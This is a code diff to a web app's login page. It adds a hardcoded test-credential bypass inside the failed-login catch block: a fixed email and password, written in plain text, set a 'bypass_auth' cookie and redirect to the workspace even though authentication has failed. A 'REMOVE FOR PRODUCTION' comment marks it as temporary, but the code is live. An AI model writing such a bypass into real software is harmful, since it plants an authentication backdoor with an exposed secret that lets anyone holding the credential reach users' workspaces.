@@ -290,6 +290,25 @@ export default function LoginPage({
         document.cookie = 'has_logged_in_before=true; path=/; max-age=31536000; SameSite=Lax' // 1 year expiry
       }
     } catch (err: any) {
+      // Bypass login for test credentials -- REMOVE FOR PRODUCTION
+      if (email === 'yourmom@yahoo.com' && password === 'Carraja!2170!!') {
+        console.warn('Bypass login used')
+        try {
+          await fetch('/api/log/client-error', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ context: 'bypass-login' }),
+          })
+        } catch (_err) {
+          console.error('Failed to log bypass login', _err)
+        }
+        if (typeof window !== 'undefined') {
+          document.cookie = 'bypass_auth=1; path=/; max-age=86400; SameSite=Lax'
+          localStorage.setItem('has_logged_in_before', 'true')
+        }
+        router.push('/workspace')
+        return
+      }
       // Handle only the special verification case that requires a redirect
       if (err.message?.includes('not verified') || err.code?.includes('EMAIL_NOT_VERIFIED')) {
         try {
